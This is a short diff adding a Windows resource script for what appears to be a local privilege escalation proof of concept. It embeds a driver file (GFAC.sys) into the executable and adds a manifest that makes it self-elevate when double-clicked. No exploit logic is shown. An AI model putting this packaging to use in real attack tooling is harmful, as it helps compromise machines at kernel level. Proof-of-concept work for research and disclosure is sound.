@@ -1,0 +1,7 @@
+// Embeds the target driver into the PoC executable.
+//   ID must match IDR_GFAC_DRIVER in GFAC_LPE_PoC.cpp
+101 RCDATA "..\\GFAC.sys"
+
+// requireAdministrator manifest so a plain double-click self-elevates.
+// (resource type 24 == RT_MANIFEST, id 1 == CREATEPROCESS_MANIFEST_RESOURCE_ID)
+1 24 "GFAC_LPE_PoC.manifest"
